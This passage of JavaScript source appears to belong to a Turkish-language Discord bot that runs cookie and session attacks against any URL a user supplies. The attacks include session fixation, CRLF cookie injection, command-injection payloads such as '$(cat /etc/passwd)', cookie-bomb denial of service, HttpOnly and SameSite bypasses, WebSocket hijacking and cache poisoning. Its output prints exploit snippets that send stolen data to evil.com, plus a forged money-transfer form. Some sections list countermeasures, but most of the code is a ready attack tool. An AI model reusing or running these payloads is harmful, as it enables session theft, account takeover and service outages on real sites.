						const sessionPatterns = ['PHPSESSID', 'JSESSIONID', 'ASP.NET_SessionId', 'sessionid', 'sid', 'sess', 'session_id'];
						let foundSession = '';
						sessionPatterns.forEach(p => {
							const regex = new RegExp(`${p}=([^;]+)`, 'i');
							const match = setCookie.match(regex);
							if (match) {
								foundSession = `${p}=${match[1]}`;
								result += `  [BULUNDU] ${foundSession}${nl}`;
							}
						});
						if (!foundSession) {
							result += `  Session cookie bulunamadi, Set-Cookie header incelenmeli.${nl}`;
							result += `  Raw: ${setCookie.slice(0, 150)}${nl}`;
						}

						result += `${nl}**2. Sabit Session Ata (Fixation):**${nl}`;
						if (foundSession) {
							const sessionValue = foundSession.split('=')[1];
							result += `  Saldirgan URL: ${base}?${foundSession.split('=')[0]}=${sessionValue}${nl}`;
							result += `  Kurbana bu URL gonderilir.${nl}`;
						}
						result += `  Test URL: ${base}?PHPSESSID=ATTAKER123${nl}`;
						result += `  Test URL: ${base};jsessionid=ATTAKER123${nl}`;

						result += `${nl}**3. Saldiri Senaryosu:**${nl}`;
						result += `  1. Siteye git, kendi session cookie'ni al${nl}`;
						result += `  2. Bu session ID'yi sorgu parametresi olarak ekle${nl}`;
						result += `  3. URL'i kurbana gonder (phishing/sosyal muhendislik)${nl}`;
						result += `  4. Kurban bu URL ile login olur${nl}`;
						result += `  5. Saldirgan ayni session ID ile oturumu calar${nl}`;

						result += `${nl}**4. Guvenlik Onlemleri:**${nl}`;
						result += `  - Login sonrasi session ID yenilenmeli${nl}`;
						result += `  - URL'de session ID tasinmamali${nl}`;
						result += `  - HttpOnly + Secure + SameSite=Strict kullanilmali${nl}`;

						await updateInteraction(interaction.application_id, interaction.token, { content: truncate(result) });
					} catch (err) {
						await updateInteraction(interaction.application_id, interaction.token, { content: `Session fixation hatasi: ${err.message}` });
					}
				})());
				return new Response(JSON.stringify({ type: 5 }), { headers: { 'Content-Type': 'application/json' } });

			// ==================== C O O K I E   Z E H I R L E ====================
			case 'cookie-zehirle':
				ctx.waitUntil((async () => {
					try {
						const url = getOption('url');
						let result = `**Cookie Zehirleme (Poisoning) Testi:** ${url}${nl}${nl}`;
						const base = url.startsWith('http') ? url : 'https://' + url;

						const baseRes = await safeFetch(base, { headers: { 'User-Agent': 'Mozilla/5.0' } }, 8000);
						const baseBody = await baseRes.text().catch(() => '');
						const baseLen = baseBody.length;

						result += `**1. Ozel Karakter Enjeksiyonu:**${nl}`;
						const payloads = [
							{ n: 'Newline (CRLF)', v: 'test%0d%0aInjected:header', t: 'crlf' },
							{ n: 'Semicolon', v: 'test;evil=injected', t: 'inject' },
							{ n: 'Comma', v: 'test,evil=injected', t: 'inject' },
							{ n: 'Backtick', v: 'test`evil`injected', t: 'cmd' },
							{ n: 'Dollar', v: 'test$(evil)injected', t: 'cmd' },
							{ n: 'Pipe', v: 'test|evil|injected', t: 'cmd' },
							{ n: 'Double Quote', v: 'test"evil"injected', t: 'break' },
							{ n: 'Null Byte', v: 'test%00evil', t: 'null' },
							{ n: 'Percent', v: 'test%25evil', t: 'encode' },
							{ n: 'Space Encode', v: 'test%20evil%20injected', t: 'space' },
						];

						for (const pl of payloads) {
							try {
								const r = await safeFetch(base, {
									headers: { 'User-Agent': 'Mozilla/5.0', 'Cookie': `session=${pl.v}` },
									redirect: 'manual'
								}, 5000);
								const body = await r.text().catch(() => '');
								const hasErr = /error|exception|warning|trace|stack|debug/i.test(body.slice(0, 1000));
								const lenDiff = Math.abs(body.length - baseLen) > 100;
								const statusBad = r.status >= 500;
								if (hasErr) result += `  [UYARI] ${pl.n}: Hata/Exception tetiklendi!${nl}`;
								else if (statusBad) result += `  [UYARI] ${pl.n}: HTTP ${r.status}${nl}`;
								else if (lenDiff) result += `  ${pl.n}: Icerik boyutu degisti (${body.length})${nl}`;
								else result += `  ${pl.n}: [OK] Etkisiz${nl}`;
							} catch (e) { result += `  ${pl.n}: Baglanti hatasi${nl}`; }
						}

						result += `${nl}**2. Parametre Enjeksiyonu:**${nl}`;
						const injectPatterns = [
							'%0d%0aSet-Cookie:zehir=injected',
							';Path=/;Domain=.evil.com',
							',secure=false',
							'`pwd`',
							'$(cat /etc/passwd)',
						];
						for (const p of injectPatterns) {
							try {
								const r2 = await safeFetch(`${base}?cookie=${encodeURIComponent(p)}`, {
									headers: { 'User-Agent': 'Mozilla/5.0' },
									redirect: 'manual'
								}, 5000);
								const respCookies = r2.headers.get('set-cookie');
								if (respCookies && respCookies.includes('injected')) {
									result += `  [KRITIK] Cookie enjekte edildi: ${respCookies.slice(0, 80)}${nl}`;
								}
							} catch (e) { /* skip */ }
						}
						result += `${nl}**3. Backend Etkileri:**${nl}`;
						result += `  - Node.js: cookie-parser'da injection${nl}`;
						result += `  - PHP: parse_str() ile degisken enjeksiyonu${nl}`;
						result += `  - Python: Cookie header parsing'de bypass${nl}`;
						result += `  - Java: Cookie processor'da code exec${nl}`;

						await updateInteraction(interaction.application_id, interaction.token, { content: truncate(result) });
					} catch (err) {
						await updateInteraction(interaction.application_id, interaction.token, { content: `Cookie zehirleme hatasi: ${err.message}` });
					}
				})());
				return new Response(JSON.stringify({ type: 5 }), { headers: { 'Content-Type': 'application/json' } });

			// ==================== C O R S   C O O K I E ====================
			case 'cors-cookie':
				ctx.waitUntil((async () => {
					try {
						const url = getOption('url');
						let result = `**CORS & Cookie Calma Analizi:** ${url}${nl}${nl}`;
						const base = url.startsWith('http') ? url : 'https://' + url;

						result += `**1. Origin Header Testi:**${nl}`;
						const origins = [
							{ o: 'https://evil.com', d: 'Sahte domain' },
							{ o: 'null', d: 'null origin (sandbox)' },
							{ o: 'https://attacker.com', d: 'Saldirgan domain' },
							{ o: `https://${new URL(base).hostname}.evil.com`, d: 'Subdomain taklidi' },
							{ o: 'https://evil.' + new URL(base).hostname.slice(0, 20), d: 'Prefix taklidi' },
						];

						let corsZafiyet = false;
						for (const o of origins) {
							try {
								const r = await safeFetch(base, {
									headers: { 'User-Agent': 'Mozilla/5.0', 'Origin': o.o },
									redirect: 'manual'
								}, 5000);
								const acao = r.headers.get('access-control-allow-origin') || '';
								const acac = r.headers.get('access-control-allow-credentials') || '';
								const acam = r.headers.get('access-control-allow-methods') || '';

								if (acao === o.o || acao === '*') {
									const creds = acac === 'true' ? '[KRITIK] Credentials TRUE!' : (acac ? `Credentials: ${acac}` : 'Credentials yok');
									result += `  ${o.d} (${o.o}): ACAO=${acao.slice(0, 50)} ${creds}${nl}`;
									if (acac === 'true') {
										corsZafiyet = true;
										result += `    [KRITIK] Cookie calinabilir!${nl}`;
									}
								} else if (acao) {
									result += `  ${o.d}: ACAO=${acao.slice(0, 50)} (origin eslesmedi)${nl}`;
								} else {
									result += `  ${o.d}: ACAO yok [OK]${nl}`;
								}
							} catch (e) { result += `  ${o.d}: Hata - ${e.message}${nl}`; }
						}

						result += `${nl}**2. CORS Guvenlik Analizi:**${nl}`;
						if (corsZafiyet) {
							result += `  [ALARM] Cookie calma CORS acigi bulundu!${nl}${nl}`;
							result += `**3. Exploit (Cookie Calma):**${nl}`;
							result += `\`\`\`javascript${nl}fetch('${base}/api/user', {${nl}  credentials: 'include'${nl}}).then(r=>r.json()).then(d=>{${nl}  fetch('https://evil.com/steal?d='+JSON.stringify(d))${nl}});${nl}\`\`\`${nl}`;
						} else {
							result += `  [OK] Cookie-calma CORS acigi tespit edilemedi.${nl}`;
						}

						result += `${nl}**3. CORS Best Practices:**${nl}`;
						result += `  - Access-Control-Allow-Origin: * ASLA credentials ile${nl}`;
						result += `  - Origin'i dinamik yansitma${nl}`;
						result += `  - Vary: Origin header kontrolu${nl}`;
						result += `  - Access-Control-Allow-Credentials: true sadece guvenli origin'ler icin${nl}`;

						await updateInteraction(interaction.application_id, interaction.token, { content: truncate(result) });
					} catch (err) {
						await updateInteraction(interaction.application_id, interaction.token, { content: `CORS cookie hatasi: ${err.message}` });
					}
				})());
				return new Response(JSON.stringify({ type: 5 }), { headers: { 'Content-Type': 'application/json' } });

			// ==================== C R L F   C O O K I E ====================
			case 'crlf-cookie':
				ctx.waitUntil((async () => {
					try {
						const url = getOption('url');
						let result = `**CRLF Injection & Set-Cookie Saldirisi:** ${url}${nl}${nl}`;
						const base = url.startsWith('http') ? url : 'https://' + url;

						result += `**1. CRLF Set-Cookie Enjeksiyonu:**${nl}`;
						const crlfPayloads = [
							{ n: 'Basic CRLF', p: '%0d%0aSet-Cookie:crlf=injected%0d%0a' },
							{ n: 'Double CRLF', p: '%0d%0a%0d%0aSet-Cookie:crlf2=injected%0d%0a' },
							{ n: 'URL Path Injection', p: '/%0d%0aSet-Cookie:path=injected%0d%0a' },
							{ n: 'LF Only', p: '%0aSet-Cookie:lf=injected%0a' },
							{ n: 'CR Only', p: '%0dSet-Cookie:cr=injected%0d' },
							{ n: 'Encoded CRLF', p: '%250d%250aSet-Cookie:enc=injected%250d%250a' },
						];

						for (const pl of crlfPayloads) {
							try {
								const sep = base.includes('?') ? '&' : '?';
								const testUrl = `${base}${sep}redirect=${pl.p}`;
								const r = await safeFetch(testUrl, {
									headers: { 'User-Agent': 'Mozilla/5.0' },
									redirect: 'manual'
								}, 5000);
								const setCookie = r.headers.get('set-cookie') || '';
								const allCookies = r.headers.get('set-cookie') ? 'present' : 'none';
								if (setCookie.includes('crlf') || setCookie.includes('injected')) {
									result += `  [KRITIK] ${pl.n}: Cookie enjekte edildi! -> ${setCookie.slice(0, 80)}${nl}`;
								} else {
									const location = r.headers.get('location') || '';
									const reflected = location.includes('Set-Cookie') || location.includes('injected');
									if (reflected) {
										result += `  [UYARI] ${pl.n}: Headerda yansidi${nl}`;
									} else {
										result += `  ${pl.n}: [OK] Etkisiz (status: ${r.status})${nl}`;
									}
								}
							} catch (e) { result += `  ${pl.n}: Hata${nl}`; }
						}

						result += `${nl}**2. Farkli Parametre Testi:**${nl}`;
						const crlfParams = ['url', 'redirect', 'next', 'return', 'callback', 'dest', 'page'];
						for (const param of crlfParams) {
							try {
								const sep = base.includes('?') ? '&' : '?';
								const r2 = await safeFetch(`${base}${sep}${param}=%0d%0aSet-Cookie:sess=stolen;HttpOnly;Secure%0d%0a`, {
									headers: { 'User-Agent': 'Mozilla/5.0' },
									redirect: 'manual'
								}, 5000);
								const sc = r2.headers.get('set-cookie') || '';
								if (sc.includes('stolen')) {
									result += `  [KRITIK] ${param} parametresi: Cookie enjekte edildi!${nl}`;
								}
							} catch (e) { /* skip */ }
						}
						result += `${nl}**3. Etki:**${nl}`;
						result += `  - Session cookie calinabilir${nl}`;
						result += `  - XSS tetiklenebilir (header injection)${nl}`;
						result += `  - Cache poisoning${nl}`;
						result += `  - Response splitting${nl}`;

						await updateInteraction(interaction.application_id, interaction.token, { content: truncate(result) });
					} catch (err) {
						await updateInteraction(interaction.application_id, interaction.token, { content: `CRLF cookie hatasi: ${err.message}` });
					}
				})());
				return new Response(JSON.stringify({ type: 5 }), { headers: { 'Content-Type': 'application/json' } });

			// ==================== S U B D O M A I N   C O O K I E ====================
			case 'subdomain-cookie':
				ctx.waitUntil((async () => {
					try {
						const domain = getOption('domain');
						let result = `**Subdomain Cookie Hijacking Analizi:** ${domain}${nl}${nl}`;
						const base = domain.startsWith('http') ? domain : 'https://' + domain;

						result += `**1. Domain Cookie Testi:**${nl}`;
						const res = await safeFetch(base, { headers: { 'User-Agent': 'Mozilla/5.0' } }, 8000);
						const setCookie = res.headers.get('set-cookie') || '';

						const domainRegex = /Domain=\.?([^;]+)/i;
						const domainMatch = setCookie.match(domainRegex);
						if (domainMatch) {
							const cookieDomain = domainMatch[1];
							result += `  Domain= ${cookieDomain}${nl}`;
							const hostname = new URL(base).hostname;
							if (cookieDomain.startsWith('.') && hostname.endsWith(cookieDomain.slice(1))) {
								result += `  [UYARI] Cookie parent domain'e yaziliyor (${cookieDomain})!${nl}`;
								result += `  Tum subdomain'ler bu cookie'ye erisebilir!${nl}`;
							}
							if (!cookieDomain.startsWith('.')) {
								result += `  [OK] Domain prefix yok, sadece host domain.${nl}`;
							}
						} else {
							result += `  Domain atribute yok - sadece origin domain'e gecerli.${nl}`;
							const hostname = new URL(base).hostname;
							if (hostname.startsWith('www.')) {
								result += `  [UYARI] www subdomain - parent domain cookie eksik olabilir.${nl}`;
							}
						}

						result += `${nl}**2. Subdomain Hijack Senaryosu:**${nl}`;
						const hostname = new URL(base).hostname;
						const parts = hostname.split('.');
						const mainDomain = parts.slice(-2).join('.');
						result += `  Ana domain: ${mainDomain}${nl}`;
						result += `  Eger Domain=.${mainDomain} ise:${nl}`;
						result += `  - Saldirgan blog.${mainDomain} subdomain'ini ele gecirir${nl}`;
						result += `  - Bu subdomain'den ${mainDomain} icin cookie set eder${nl}`;
						result += `  - ${bt}Set-Cookie: session=stolen; Domain=.${mainDomain}; Path=/; HttpOnly${bt}${nl}`;
						result += `  - Kurban ana siteye gidince saldirganin cookie'si kullanilir${nl}`;

						result += `${nl}**3. Cookie Yazma Testi:**${nl}`;
						result += `  ${bt}document.cookie = "test=subdomain; domain=.${mainDomain}; path=/"${bt}${nl}`;
						result += `  ${bt}curl -H "Cookie: test=subdomain" ${base}${nl}${nl}`;

						result += `**4. Onlemler:**${nl}`;
						result += `  - Subdomain'leri guvene al (DNS, hosting)${nl}`;
						result += `  - __Host- prefix kullan (sadece origin)${nl}`;
						result += `  - Domain atribute'u kisitla${nl}`;
						result += `  - Subdomain izolasyonu yap${nl}`;

						await updateInteraction(interaction.application_id, interaction.token, { content: truncate(result) });
					} catch (err) {
						await updateInteraction(interaction.application_id, interaction.token, { content: `Subdomain cookie hatasi: ${err.message}` });
					}
				})());
				return new Response(JSON.stringify({ type: 5 }), { headers: { 'Content-Type': 'application/json' } });

			// ==================== C O O K I E   B O M B ====================
			case 'cookie-bomb':
				ctx.waitUntil((async () => {
					try {
						const url = getOption('url');
						let result = `**Cookie Bomb (Overflow) Saldirisi:** ${url}${nl}${nl}`;
						const base = url.startsWith('http') ? url : 'https://' + url;

						result += `**1. Normal Cookie Boyutu Testi:**${nl}`;
						const normalRes = await safeFetch(base, { headers: { 'User-Agent': 'Mozilla/5.0' } }, 8000);
						result += `  Normal istek: HTTP ${normalRes.status}${nl}${nl}`;

						result += `**2. Cookie Bomb Denemeleri:**${nl}`;
						const sizes = [500, 1000, 2000, 3000, 4000, 6000];
						const overflowStatuses = {};
						let maxSafe = 0;
						let overflowAt = 0;

						for (const size of sizes) {
							try {
								const bigCookie = 'x'.repeat(size);
								const r = await safeFetch(base, {
									headers: { 'User-Agent': 'Mozilla/5.0', 'Cookie': `bomb=${bigCookie}` },
									redirect: 'manual'
								}, 5000);
								const st = r.status;
								overflowStatuses[size] = st;
								if (st < 400) {
									maxSafe = size;
									result += `  ${size} chars: HTTP ${st} [OK]${nl}`;
								} else {
									if (!overflowAt) overflowAt = size;
									result += `  ${size} chars: HTTP ${st} [UYARI]${nl}`;
								}
							} catch (e) {
								result += `  ${size} chars: HATA - ${e.message}${nl}`;
								if (!overflowAt) overflowAt = size;
							}
						}

						result += `${nl}**3. Analiz:**${nl}`;
						if (overflowAt > 0) {
							result += `  [UYARI] ${overflowAt}+ karakterde sunucu overflow!${nl}`;
							result += `  Max guvenli boyut: ${maxSafe} chars${nl}`;
						} else {
							result += `  [OK] 6000 karaktere kadar sorun yok.${nl}`;
						}

						result += `${nl}**4. Cookie Bomb DoS Payload:**${nl}`;
						const bombPayload = 'bomb' + 'A'.repeat(3997);
						result += `  ${bt}${bombPayload.slice(0, 60)}...${bt}${nl}`;
						result += `  curl komutu:${nl}`;
						result += `  ${bt}curl -b "bomb=${bombPayload.slice(0, 30)}..." ${base}${bt}${nl}${nl}`;

						result += `**5. Subdomain Cookie Bomb:**${nl}`;
						const hostname2 = new URL(base).hostname;
						const mainDom = hostname2.split('.').slice(-2).join('.');
						result += `  Domain=.${mainDom} ile tum subdomain'lere yayilir${nl}`;
						result += `  Her subdomain'e farkli 4KB cookie -> toplam header >16KB${nl}`;
						result += `  Sonuc: Tum alt alan adlari erisilemez hale gelir${nl}`;

						await updateInteraction(interaction.application_id, interaction.token, { content: truncate(result) });
					} catch (err) {
						await updateInteraction(interaction.application_id, interaction.token, { content: `Cookie bomb hatasi: ${err.message}` });
					}
				})());
				return new Response(JSON.stringify({ type: 5 }), { headers: { 'Content-Type': 'application/json' } });

			// ==================== H T T P O N L Y   B Y P A S S ====================
			case 'httponly-bypass':
				ctx.waitUntil((async () => {
					try {
						const url = getOption('url');
						let result = `**HttpOnly Bypass Analizi:** ${url}${nl}${nl}`;
						const base = url.startsWith('http') ? url : 'https://' + url;

						result += `**1. TRACE Metodu Testi:**${nl}`;
						try {
							const tr = await safeFetch(base, { method: 'TRACE', headers: { 'User-Agent': 'Mozilla/5.0' } }, 5000);
							const tBody = await tr.text().catch(() => '');
							if (tr.status === 200 && tBody.includes('Cookie')) {
								result += `  [KRITIK] TRACE metodu cookie sizdiriyor!${nl}`;
								result += `  Response: ${tBody.slice(0, 200)}${nl}`;
							} else {
								result += `  [OK] TRACE metodu kapali veya cookie sizdirmiyor.${nl}`;
							}
						} catch (e) { result += `  TRACE testi basarisiz.${nl}`; }

						result += `${nl}**2. Debug Endpoint Taramasi:**${nl}`;
						const debugPaths = [
							'/phpinfo.php', '/info.php', '/debug', '/status', '/actuator',
							'/actuator/env', '/actuator/beans', '/server-status', '/server-info',
							'/metrics', '/health', '/.env', '/config', '/api/debug',
							'/api/status', '/dump', '/trace', '/console', '/admin/phpinfo',
						];

						let leaked = false;
						for (const path of debugPaths) {
							try {
								const r = await safeFetch(`${base}${path}`, {
									headers: { 'User-Agent': 'Mozilla/5.0', 'Cookie': 'test=httponly_bypass_check' },
									redirect: 'manual'
								}, 5000);
								if (r.status === 200) {
									const body = await r.text().catch(() => '');
									if (body.includes('HTTP_COOKIE') || body.includes('_COOKIE') || body.includes('session') || body.includes('test=httponly_bypass_check')) {
										result += `  [KRITIK] ${path}: Cookie degerleri siziyor!${nl}`;
										leaked = true;
									} else {
										result += `  ${path}: HTTP 200 (cookie yok)${nl}`;
									}
								} else if (r.status !== 404) {
									result += `  ${path}: HTTP ${r.status}${nl}`;
								}
							} catch (e) { /* skip */ }
						}
						if (!leaked) result += `  [OK] Debug endpoint'lerinden cookie sizmadi.${nl}`;

						result += `${nl}**3. HttpOnly Bypass Teknikleri:**${nl}`;
						result += `  - TRACE metodu ile header yansimasi${nl}`;
						result += `  - PHP info / debug sayfalari${nl}`;
						result += `  - Server-Side Request Forgery (SSRF)${nl}`;
						result += `  - XSS ile HttpOnly cookie okunamaz (koruma)${nl}`;
						result += `  - Ama XSS ile proxy/relay yapilabilir${nl}`;

						await updateInteraction(interaction.application_id, interaction.token, { content: truncate(result) });
					} catch (err) {
						await updateInteraction(interaction.application_id, interaction.token, { content: `HttpOnly bypass hatasi: ${err.message}` });
					}
				})());
				return new Response(JSON.stringify({ type: 5 }), { headers: { 'Content-Type': 'application/json' } });

			// ==================== S A M E S I T E   B Y P A S S ====================
			case 'samesite-bypass':
				ctx.waitUntil((async () => {
					try {
						const url = getOption('url');
						let result = `**SameSite Cookie Bypass Teknikleri:** ${url}${nl}${nl}`;
						const base = url.startsWith('http') ? url : 'https://' + url;

						result += `**1. SameSite Kontrolu:**${nl}`;
						const res = await safeFetch(base, { headers: { 'User-Agent': 'Mozilla/5.0' } }, 8000);
						const setCookie = res.headers.get('set-cookie') || '';
						if (setCookie.includes('SameSite=Strict')) {
							result += `  SameSite=Strict [OK] En guvenli mod${nl}`;
						} else if (setCookie.includes('SameSite=Lax')) {
							result += `  SameSite=Lax [OK] - Bazi bypass mumkun${nl}`;
						} else if (setCookie.includes('SameSite=None')) {
							result += `  SameSite=None [UYARI] Secure ile birlikte olmali${nl}`;
						} else {
							result += `  SameSite YOK [ZAFIYET] - Default olarak Lax${nl}`;
						}

						result += `${nl}**2. Popup Window Teknigi (Strict bypass):**${nl}`;
						result += `  - window.open ile ayni domain acilir${nl}`;
						result += `  - Popup window'da cookie gecerli${nl}`;
						result += `  - Ana pencereden popup'a mesaj gonderilir${nl}`;
						result += `\`\`\`javascript${nl}let w = window.open('${base}/profile');${nl}setTimeout(() => w.postMessage('steal', '*'), 2000);${nl}\`\`\`${nl}`;

						result += `${nl}**3. Form POST Teknigi (Lax bypass):**${nl}`;
						result += `  - SameSite=Lax: Top-level navigasyon GET cookie gonderir${nl}`;
						result += `  - Form POST ile 2 dakika window actif${nl}`;
						result += `\`\`\`html${nl}<form method="POST" action="${base}/api/transfer">${nl}  <input name="to" value="attacker">${nl}  <input name="amount" value="1000">${nl}</form>${nl}<script>document.forms[0].submit()</script>${nl}\`\`\`${nl}`;

						result += `${nl}**4. 302 Redirect Zinciri (Lax bypass):**${nl}`;
						const hostname = new URL(base).hostname;
						result += `  - Saldirgan sitesinden -> hedef siteye 302 redirect${nl}`;
						result += `  - SameSite=Lax cookie redirect'te gonderilir${nl}`;
						result += `  URL: ${base}/redirect?url=https://evil.com/steal${nl}`;

						result += `${nl}**5. Sibling Subdomain Injection (Strict bypass):**${nl}`;
						const parts = hostname.split('.');
						const mainDomain = parts.slice(-2).join('.');
						result += `  - Eger subdomain XSS varsa .${mainDomain} cookie yazilabilir${nl}`;
						result += `  - ${bt}document.cookie="session=stolen;domain=.${mainDomain};path=/"${bt}${nl}`;

						await updateInteraction(interaction.application_id, interaction.token, { content: truncate(result) });
					} catch (err) {
						await updateInteraction(interaction.application_id, interaction.token, { content: `SameSite bypass hatasi: ${err.message}` });
					}
				})());
				return new Response(JSON.stringify({ type: 5 }), { headers: { 'Content-Type': 'application/json' } });

			// ==================== L O C A L S T O R A G E   A V L A ====================
			case 'localstorage-avla':
				ctx.waitUntil((async () => {
					try {
						const url = getOption('url');
						let result = `**LocalStorage/SessionStorage Token Avlama:** ${url}${nl}${nl}`;
						const base = url.startsWith('http') ? url : 'https://' + url;

						result += `**1. Sayfa ve JS Dosyalari Cekiliyor...**${nl}`;
						const res = await safeFetch(base, { headers: { 'User-Agent': 'Mozilla/5.0' } }, 10000);
						const html = await res.text().catch(() => '');
						const scriptSrcs = [...html.matchAll(/<script[^>]*src=["']([^"']+)["'][^>]*>/gi)].map(m => m[1]);

						result += `  Ana sayfa: ${html.length} bytes${nl}`;
						result += `  Bulunan script URL'leri: ${scriptSrcs.length} adet${nl}${nl}`;

						result += `**2. JS Dosyalarinda Hassas Veri Taramasi:**${nl}`;
						const sensitivePatterns = [
							{ p: /localStorage\.getItem\s*\(/gi, l: 'localStorage.getItem()', r: '[UYARI]' },
							{ p: /sessionStorage\.getItem\s*\(/gi, l: 'sessionStorage.getItem()', r: '[UYARI]' },
							{ p: /localStorage\.setItem\s*\(\s*['"](access|auth|token|jwt|session|key|api|secret|bearer)/gi, l: 'localStorage.setItem(token)', r: '[KRITIK]' },
							{ p: /sessionStorage\.setItem\s*\(\s*['"](access|auth|token|jwt|session|key|api|secret|bearer)/gi, l: 'sessionStorage.setItem(token)', r: '[KRITIK]' },
							{ p: /eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]+/g, l: 'JWT pattern', r: '[UYARI]' },
							{ p: /(api[_-]?key|apikey|api_secret)\s*[:=]\s*['"`][A-Za-z0-9_-]{10,}/gi, l: 'API Key hardcoded', r: '[KRITIK]' },
							{ p: /(access[_-]?token|auth[_-]?token)\s*[:=]\s*['"`]/gi, l: 'Access token', r: '[UYARI]' },
							{ p: /(bearer|authorization)\s*[:=]\s*['"`]/gi, l: 'Bearer token', r: '[UYARI]' },
							{ p: /document\.cookie/g, l: 'document.cookie', r: '[UYARI]' },
						];

						const findings = [];
						const allJS = html;
						sensitivePatterns.forEach(sp => {
							const matches = [...allJS.matchAll(sp.p)];
							if (matches.length > 0) {
								findings.push(`  ${sp.r}: ${matches.length}x ${sp.l} bulundu`);
							}
						});

						if (findings.length > 0) {
							result += findings.join(nl) + nl;
						} else {
							result += `  [OK] Ana sayfada hassas pattern bulunamadi.${nl}`;
						}

						result += `${nl}**3. Harici JS Analizi:**${nl}`;
						let jsFindings = 0;
						for (const src of scriptSrcs.slice(0, 15)) {
							try {
								const jsUrl = src.startsWith('http') ? src : (src.startsWith('//') ? 'https:' + src : new URL(src, base).href);
								const jsRes = await safeFetch(jsUrl, { headers: { 'User-Agent': 'Mozilla/5.0' } }, 5000);
								const jsCode = await jsRes.text().catch(() => '');
								sensitivePatterns.forEach(sp => {
									const matches = [...jsCode.matchAll(sp.p)];
									if (matches.length > 0) {
										result += `  ${jsUrl.slice(0, 60)}: ${sp.l} (${matches.length}x)${nl}`;
										jsFindings++;
									}
								});
							} catch (e) { /* skip */ }
						}
						if (jsFindings === 0) result += `  [OK] Harici JS'lerde hassas pattern bulunamadi.${nl}`;

						result += `${nl}**4. Guvenlik Onlemleri:**${nl}`;
						result += `  - Token'lari HttpOnly cookie'de sakla${nl}`;
						result += `  - localStorage XSS'e karsi korumasiz${nl}`;
						result += `  - sessionStorage sekme kapandiginda temizlenir${nl}`;
						result += `  - BFF (Backend For Frontend) pattern kullan${nl}`;

						await updateInteraction(interaction.application_id, interaction.token, { content: truncate(result) });
					} catch (err) {
						await updateInteraction(interaction.application_id, interaction.token, { content: `LocalStorage avlama hatasi: ${err.message}` });
					}
				})());
				return new Response(JSON.stringify({ type: 5 }), { headers: { 'Content-Type': 'application/json' } });

			// ==================== W E B S O C K E T   C O O K I E ====================
			case 'websocket-cookie':
				ctx.waitUntil((async () => {
					try {
						const url = getOption('url');
						let result = `**WebSocket Cookie Hijacking Analizi:** ${url}${nl}${nl}`;
						const base = url.startsWith('http') ? url : 'https://' + url;

						result += `**1. WebSocket Endpoint Tespiti:**${nl}`;
						const res = await safeFetch(base, { headers: { 'User-Agent': 'Mozilla/5.0' } }, 8000);
						const html = await res.text().catch(() => '');
						const wsUrls = [...html.matchAll(/["'](ws[s]?:\/\/[^"']+)["']/gi)].map(m => m[1]);
						const wsConstruct = [...html.matchAll(/new\s+WebSocket\s*\(\s*["'`]([^"'`]+)["'`]/gi)].map(m => m[1]);

						const allWs = [...new Set([...wsUrls, ...wsConstruct])];
						if (allWs.length > 0) {
							result += `  Bulunan WebSocket endpoint'leri:${nl}`;
							allWs.forEach(w => result += `    ${w}${nl}`);
						} else {
							result += `  Sayfada WebSocket bulunamadi.${nl}`;
							const wsProto = base.startsWith('https') ? 'wss' : 'ws';
							const wsHost = new URL(base).hostname;
							result += `  Tahmini endpoint: ${wsProto}://${wsHost}/ws${nl}`;
						}

						result += `${nl}**2. Cookie Gecisi Analizi:**${nl}`;
						result += `  WebSocket handshake HTTP uzerinden yapilir${nl}`;
						result += `  Cookie'ler otomatik olarak gonderilir (varsayilan)${nl}`;
						result += `  Origin header kontrolu yoksa cross-site baglanilabilir${nl}${nl}`;

						result += `**3. Cross-Site WebSocket Hijacking (CSWSH):**${nl}`;
						result += `\`\`\`javascript${nl}let ws = new WebSocket('wss://target.com/ws');${nl}ws.onopen = () => ws.send(JSON.stringify({cmd:'steal'}));${nl}ws.onmessage = (e) => {${nl}  fetch('https://evil.com/steal?d='+e.data);${nl}};${nl}\`\`\`${nl}`;

						result += `${nl}**4. WebSocket Guvenlik Testi:**${nl}`;
						try {
							const wsProto = base.startsWith('https') ? 'wss' : 'ws';
							const wsHost = new URL(base).hostname;
							const testEndpoint = allWs[0] || `${wsProto}://${wsHost}/ws`;
							const httpEquiv = testEndpoint.replace(/^ws/, 'http');
							const wsTest = await safeFetch(httpEquiv, {
								headers: {
									'User-Agent': 'Mozilla/5.0',
									'Origin': 'https://evil.com',
									'Upgrade': 'websocket',
									'Connection': 'Upgrade',
									'Sec-WebSocket-Key': 'dGhlIHNhbXBsZSBub25jZQ==',
									'Sec-WebSocket-Version': '13',
								},
								redirect: 'manual'
							}, 5000);
							const acao = wsTest.headers.get('access-control-allow-origin') || '';
							if (acao === '*' || acao === 'https://evil.com') {
								result += `  [UYARI] CORS cross-origin WebSocket baglantisi mumkun!${nl}`;
							} else {
								result += `  [OK] WebSocket handshake test edildi.${nl}`;
							}
						} catch (e) { result += `  WebSocket testi basarisiz: ${e.message}${nl}`; }

						result += `${nl}**5. Guvenlik Onlemleri:**${nl}`;
						result += `  - Origin header dogrulamasi${nl}`;
						result += `  - CSRF token WebSocket baglantilari icin${nl}`;
						result += `  - Authentication token'larini query param yerine cookie'de${nl}`;
						result += `  - SameSite=Strict cookie kullanimi${nl}`;

						await updateInteraction(interaction.application_id, interaction.token, { content: truncate(result) });
					} catch (err) {
						await updateInteraction(interaction.application_id, interaction.token, { content: `WebSocket cookie hatasi: ${err.message}` });
					}
				})());
				return new Response(JSON.stringify({ type: 5 }), { headers: { 'Content-Type': 'application/json' } });

			// ==================== C A C H E   Z E H I R L E ====================
			case 'cache-zehirle':
				ctx.waitUntil((async () => {
					try {
						const url = getOption('url');
						let result = `**Web Cache Poisoning (Cookie Hirsizligi):** ${url}${nl}${nl}`;
						const base = url.startsWith('http') ? url : 'https://' + url;

						result += `**1. Cache Header Analizi:**${nl}`;
						const res = await safeFetch(base, { headers: { 'User-Agent': 'Mozilla/5.0' } }, 8000);
						const headers = res.headers;
						const cacheHeaders = ['x-cache', 'x-cache-hits', 'cf-cache-status', 'x-served-by', 'age', 'cache-control', 'x-cache-lookup'];
						let cacheDetected = false;
						cacheHeaders.forEach(h => {
							const val = headers.get(h);
							if (val) {
								result += `  ${h}: ${val}${nl}`;
								cacheDetected = true;
							}
						});
						if (!cacheDetected) result += `  [OK] Belirgin cache header'i bulunamadi.${nl}`;

						result += `${nl}**2. X-Forwarded-Host Enjeksiyonu:**${nl}`;
						const poisonedHosts = [
							{ h: 'evil.com', d: 'Basit domain' },
							{ h: 'evil.com"><script>alert(1)</script>', d: 'XSS enjeksiyonu' },
